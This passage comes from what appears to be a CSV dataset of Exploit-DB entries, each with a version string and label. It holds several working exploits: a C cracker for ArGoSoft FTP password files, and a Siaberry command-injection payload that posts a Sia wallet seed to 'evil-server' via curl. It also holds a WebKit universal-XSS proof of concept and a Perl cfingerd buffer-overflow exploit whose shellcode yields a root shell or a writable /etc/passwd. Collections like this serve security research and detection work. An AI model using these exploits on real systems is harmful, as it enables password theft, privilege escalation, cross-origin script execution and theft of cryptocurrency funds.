Etc..  ############################################### EOF ##################################################  # milw0rm.com [2009-06-15]",['1.2.0'],1
21009,"ArGoSoft FTP Server 1.2.2.2 - Weak Password Encryption // source: https://www.securityfocus.com/bid/3029/info  ArGoSoft FTP server is an FTP server for the Windows platform.  A design error exists in ArGoSoft FTP which enables an authenticated user to view other users encrypted passwords. However due to a weak encryption scheme it is possible for a user to decrypt the password using a third party utility.   /********************************************************************   * agscrack.c - ArGoSoft FTP Server 1.2.2.2 password file cracker   *   * by [ByteRage] <byterage@yahoo.com> [http://www.byterage.cjb.net] *   ********************************************************************/    #include <string.h>  #include <stdio.h>    int len; FILE *fh;    /* DECRYPTION ALGORITHMS */  unsigned char char2bin(unsigned char inbyte) {    if ((inbyte >= 'A') && (inbyte <= 'Z')) { len++; return(inbyte-'A'); }    if ((inbyte >= 'a') && (inbyte <= 'z')) { len++; return(inbyte-'a'+26); }    if ((inbyte >= '0') && (inbyte <= '9')) { len++; return(inbyte+4); }    if (inbyte == '+') { len++; return('\x3E'); }    if (inbyte == '/') { len++; return('\x3F'); }    return('\x00');  }  void decode(unsigned char chars[], unsigned char bytes[]) {    int i,retval=0;    for(i=0; i<4; i++) { retval <<= 6; retval |= char2bin(chars[i]); }    for(i=0; i<3; i++) { bytes[2-i] = retval & 0xFF; retval >>= 8; }    len--;  }  void decryptpass(unsigned char encrypted[], unsigned char decrypted[]) {    const unsigned char heavycrypt0[] = ""T3ZlciB0aGUgaGlsbHMgYW5kIGZhciBhd2F5LCBUZWxldHViYmllcyBjb21lIHRvIHBsYXk ="";    unsigned int j, k=0, l;    len = 0;    for(j=0; j<strlen(encrypted); j+=4) {      decode(&encrypted[j], &decrypted[k]);      for(l=0; l<3; l++) { decrypted[k] ^= heavycrypt0[k++]; }    }    decrypted[len] = '\x00';  }  /* DECRYPTION ALGORITHMS END */    void main(int argc, char ** argv) {    char password[128]; /* ArGoSoft's passwords don't get larger than 128 bytes */    char buf[256]; char b;    int rd;      printf(""ArGoSoft FTP Server 1.2.2.2 password file cracker by [ByteRage]\n\n"");    if (argc<2) { printf(""Syntax : %s <password(file)>\n"", argv[0]); return 1; }        fh = fopen(argv[1], ""rb"");    if (!fh) {      decryptpass(argv[1], &password);      printf(""%s -> %s\n"", argv[1], password);      return 0;    } else {      /* simple password file processor */      fread(&buf,1,1,fh);      if (buf[0] == 4) {        while (1) {          if (fread(&b,1,1,fh) == 0) { break; }          if (fread(&buf,1,b+1,fh) == 0) { break; }          printf(""%s : "", buf);          b=0; while(!b) if (fread(&b,1,1,fh) == 0) { break; }          if (fread(&buf,1,b+1,fh) == 0) { break; }          decryptpass(&buf, &password);          printf(""%s -> %s\n"", &buf, password);          b=0; while(!b) if (fread(&b,1,1,fh) == 0) { break; }          if (fread(&buf,1,b+1,fh) == 0) { break; }          b=0; while(b!=4) if (fread(&b,1,1,fh) == 0) { break; }        }      } else printf(""error when processing passwordfile!"");      fclose(fh);      }  }",['1.2.2.2'],1
44879,"Siaberry 1.2.2 - Command Injection ## Siaberry's Command Injection Vulnerability Today, I’d like to share several interesting vulnerabilities I discovered in Siaberry, a hardware device for earning cryptocurrency.  Siaberry runs on Sia, a decentralized marketplace for buying and selling data storage. The device is intended to give consumers a plug ‘n play solution to sell storage on Sia’s network, though the two teams have no formal relationship. As buyers purchase space, Siaberry earns income for its owner in the form of Sia’s utility token, Siacoin.  I run a Sia node on my Synology NAS, but I was drawn to Siaberry’s promise of a user-friendly web UI. I took Siaberry for a test drive, and I was blown away by how many serious issues I discovered within just a few hours.  ## Command injection: working exploit My most exciting finding was a command injection vulnerability on the login page.  In the video below, I demonstrate how an attacker can extract the private key from the victim’s Sia wallet simply by entering a particular password on Siaberry’s login page:      https://www.youtube.com/watch?v=eVOyDglf4vE  ## Understanding the vulnerability The vulnerability is so obvious that many developers and security experts could tell you exactly what the code looked like by watching the video demo above. I’ll confirm your suspicions.  The problem occurred in ActionPage.php:  ``` $user=$_POST['uname']; $pass=$_POST['psw']; exec(""sudo bin/checker $user $pass"", $output, $exitcode); ```  That’s it. That’s the whole vulnerability.  Siaberry took untrusted input directly from an HTTP POST request and immediately executed it in the shell. This was a painfully easy vulnerability to exploit.  ## How the exploit works To exploit this, I created an attack server called evil-server. From that machine, I started netcat to dump all traffic it received on port 5555. For convenience, I used a server on my local network, but the same attack would work with any server address, remote or local.  I then used foo as the username and supplied a password of `badpassword || curl -d ""$(siac wallet seeds)"" -X POST evil-server:5555`.  When ActionPage.php reached its exec line, it executed the following command:  ``` sudo bin/checker foo badpassword || \   curl -d ""$(siac wallet seeds)"" -X POST evil-server:5555 ```  This caused the shell to execute three different commands. The first was the command that Siaberry meant to execute:  ``` sudo bin/checker foo badpassword ```  This returned a non-zero exit code because foo/badpassword was a bad username/password combination. Therefore, the shell proceeded to execute the other side of the ||, starting with the embedded command:  ``` siac wallet seeds ```  This launched siac, the Sia command-line interface. Those command-line parameters tell Sia to print its wallet seed to the console. The wallet seed is a 29-word passphrase that represents the wallet’s private key. Anyone who has this passphrase completely controls all funds in the victim’s wallet.  ``` curl -d ""$(siac wallet seeds)"" -X POST evil-server:5555 ```  Finally, the curl command made an HTTP POST request to http://evil-server:5555, sending the Sia wallet seed as the payload. The attacker, capturing messages on port 5555, recorded the victim’s wallet seed, giving them the ability to steal all funds in the victim’s wallet.",['1.2.2'],1
47591,"WebKit - Universal XSS in JSObject::putInlineSlow and JSValue::putToPrimitive VULNERABILITY DETAILS ``` bool JSObject::putInlineSlow(ExecState* exec, PropertyName propertyName, JSValue value, PutPropertySlot& slot) {     ASSERT(!isThisValueAltered(slot, this));      VM& vm = exec->vm();     auto scope = DECLARE_THROW_SCOPE(vm);      JSObject* obj = this;     for (;;) {         unsigned attributes;         PropertyOffset offset = obj->structure(vm)->get(vm, propertyName, attributes); // ***1***         if (isValidOffset(offset)) {             if (attributes & PropertyAttribute::ReadOnly) {                 ASSERT(this->prototypeChainMayInterceptStoreTo(vm, propertyName) || obj == this);                 return typeError(exec, scope, slot.isStrictMode(), ReadonlyPropertyWriteError);             }              JSValue gs = obj->getDirect(offset);             if (gs.isGetterSetter()) {                 // We need to make sure that we decide to cache this property before we potentially execute aribitrary JS.                 if (!structure(vm)->isDictionary())                     slot.setCacheableSetter(obj, offset);                  bool result = callSetter(exec, slot.thisValue(), gs, value, slot.isStrictMode() ? StrictMode : NotStrictMode); // ***2***                 RETURN_IF_EXCEPTION(scope, false);                 return result;             }             if (gs.isCustomGetterSetter()) {                 // We need to make sure that we decide to cache this property before we potentially execute aribitrary JS.                 if (attributes & PropertyAttribute::CustomAccessor)                     slot.setCustomAccessor(obj, jsCast<CustomGetterSetter*>(gs.asCell())->setter());                 else                     slot.setCustomValue(obj, jsCast<CustomGetterSetter*>(gs.asCell())->setter());                  bool result = callCustomSetter(exec, gs, attributes & PropertyAttribute::CustomAccessor, obj, slot.thisValue(), value);                 RETURN_IF_EXCEPTION(scope, false);                 return result;             }             ASSERT(!(attributes & PropertyAttribute::Accessor));              // If there's an existing property on the object or one of its              // prototypes it should be replaced, so break here.             break;         } [...]         JSValue prototype = obj->getPrototype(vm, exec);         RETURN_IF_EXCEPTION(scope, false);         if (prototype.isNull())             break;         obj = asObject(prototype);     } ```  This is an extension of https://bugs.chromium.org/p/project-zero/issues/detail?id=1240. `putInlineSlow` and `putToPrimitive` now call the access-checked `getPrototype` method instead of `getPrototypeDirect`. However, they still use `Structure::get` directly[1], which bypasses access checks implemented in functions that override `JSObject::put`. Thus, an attacker can put a cross-origin object into the prototype chain of a regular object and trigger the invocation of a cross-origin setter. If the setter raises an exception while processing the passed value, it's possible to leak the exception object and gain access to, e.g., another window's function constructor.  Since this issue is only exploitable when a victim page defines a custom accessor property on the `location` object, its practical impact is minimal.   VERSION WebKit revision 247430  Safari version 12.1.1 (14607.2.6.1.1)   REPRODUCTION CASE <body> <script> frame = document.body.appendChild(document.createElement('iframe')); frame.src = `data:text/html,   <h1>secret data</h1>   <script>     location.__defineSetter__('foo', function(value) {       alert('Received value: ' + value);     });   </s` + `cript>`;  function turnLeakedExceptionIntoUXSS(object) {   try {     object.foo = {toString: function() { return {} } };   } catch (e) {     let func = e.constructor.constructor;     func('alert(document.body.innerHTML)')();   } }  frame.onload = () => {   // putInlineSlow   turnLeakedExceptionIntoUXSS({__proto__: frame.contentWindow.location});    // putToPrimitive   num = 1337;   num.__proto__.__proto__ = frame.contentWindow.location;   turnLeakedExceptionIntoUXSS(num); } </script> </body>",['12.1.1'],1
20962,"cfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (1) source: https://www.securityfocus.com/bid/2914/info  cfingerd is a secure implementation of the finger daemon. cfingerd has been contributed to by many authors, and is maintained by the cfingerd development team.  A buffer overflow in cfingerd makes it possible for a local user to gain elevated privileges. Due to insufficient validation of input, a user can execute arbitrary code through the .nofinger file.  This makes it possible for a local user to gain elevated privileges, and potentially root access.   #!/usr/bin/perl  # | Local buffer overflow exploit for cfingerd # | Copyright (c) 2001 by <teleh0r@digit-labs.org> # | All rights reserved. # | # | Simple exploit for the vulnerability reported # | to bugtraq by Steven Van Acker. # | http://www.securityfocus.com/archive/1/192844 # | # | If cfingerd does not run as root, the exploit # | will of course fail! # | # | http://www.digit-labs.org/teleh0r/  use Socket; use File::Copy; use Getopt::Std; getopts('s:p:o:', \%arg);  if (defined($arg{'s'})) { $sjell  = $arg{'s'} } if (defined($arg{'p'})) { $port   = $arg{'p'} } if (defined($arg{'o'})) { $offset = $arg{'o'} }  # shellcodes written by myself especially for # this exploit.  # 34 bytes $shellcode1 =   ""\x31\xdb"".                # xor  ebx, ebx   ""\x31\xc9"".                # xor  ecx, ecx   ""\xf7\xe3"".                # mul  ebx   ""\x52"".                    # push edx   ""\x68\x2f\x2f\x79\x30"".    # push dword 0x30792f2f   ""\x68\x2f\x74\x6d\x70"".    # push dword 0x706d742f   ""\x89\xe3"".                # mov  ebx, esp   ""\xb0\xb6"".                # mov  al, 0xb6   ""\xcd\x80"".                # int  0x80   ""\x66\xb9\xed\x0d"".        # mov  cx, 0xded   ""\xb0\x0f"".                # mov  al, 0xf   ""\xcd\x80"".                # int  0x80   ""\x40"".                    # inc  eax   ""\xcd\x80"";                # int  0x80  # 35 bytes $shellcode2 =   ""\xeb\x10"".                # jmp  short file   ""\x5b"".                    # pop  ebx   ""\x31\xc9"".                # xor  ecx, ecx   ""\xf7\xe1"".                # mul  ecx   ""\x66\xb9\xa6\x01"".        # mov  cx, 0x1a6   ""\xb0\x0f"".                # mov  al, mov   ""\xcd\x80"".                # int  0x80   ""\x40"".                    # inc  eax   ""\xcd\x80"".                # int  0x80   ""\xe8\xeb\xff\xff\xff"".    # call code   ""/etc/passwd"".             # string   ""\x00"";                    # null terminate  # cfingerd does not drop privileges before the  # vulnerable code kicks in, therefore no need  # to use setuid(0);  if (!(defined($sjell))||$sjell !~ m/^(1|2)$/) {&usage} $shellcode = $sjell == 1 ? $shellcode1 : $shellcode2;  $port  ||= 2003; $user    = getlogin() || getpwuid($<); $return  = 0xbffff46c; $length  = 88; $kewlnop = 'K'; $homedir = (getpwnam($user))[7];  printf(""Address: %#lx\n"", ($return + $offset)); &do_checkz;  if (connect_host('127.0.0.1', $port)) {     &prepare_attack;      send(SOCKET, ""$user\015\012"", 0);     close(SOCKET);      sleep(1);      &do_checkz;      die(""Sorry, exploit failed - check the values.\n""); }  sub prepare_attack {     for ($i = 0; $i < ($length - 2 - 4); $i++) { 	$buffer .= $kewlnop;     }          #<82'nops'><jmp 0x4><retaddr><shellcode>      $buffer .= ""\xeb\x04"";     $buffer .= pack('l', ($return + $offset));     $buffer .= $shellcode;      if (-e(""$homedir/.nofinger"")) { # I am nice, huh? 	copy(""$homedir/.nofinger"", ""$homedir/.nofinger.BAK"");     }          open(FILE, "">$homedir/.nofinger"") || die(""Error: $!\n"");     print(FILE ""\$$buffer\n"");     close(FILE);     } 	 sub do_checkz {     if ($sjell == '1') { 	if (-u(""/tmp/y0"") && (stat(""/tmp/y0""))[4,5] == '0') { 	    print(""Exploit attempt succeeded!\n""); 	    exec(""/tmp/y0"");	     	} elsif (stat(""/tmp/y0"") == '0') { 	    copy(""/bin/sh"", ""/tmp/y0"") || die(""Error: $!\n""); 	}     } elsif ($sjell == '2') { 	if (-w(""/etc/passwd"")) { 	    ($perm) = (split(/\s/,`ls -la /etc/passwd`))[0]; 	    print(""Success: /etc/passwd $perm\n""); 	    exit(0); 	}     }  }  sub usage { system(""clear"");  # below layout style stolen from qitest1 xinetd exploit ;) # werd!  print(qq( cfingerd <= 1.4.3-8 local exploit by teleh0r All rights reserved.  Usage: $0 [options] Options:   -s shellcode  - see below   -p port       - 2003 default   -o offset   Available shellcodes:   1\) root shell in /tmp   2\) writable /etc/passwd  )); exit(1); }  sub connect_host {     ($target, $port) = @_;     $iaddr  = inet_aton($target)                 || die(""Error: $!\n"");     $paddr  = sockaddr_in($port, $iaddr)         || die(""Error: $!\n"");     $proto  = getprotobyname('tcp')              || die(""Error: $!\n"");      socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(""Error: $!\n"");     connect(SOCKET, $paddr)                      || die(""Error: $!\n"");     return(1); }",['1.4.1/1.4.2/1.4.3'],1
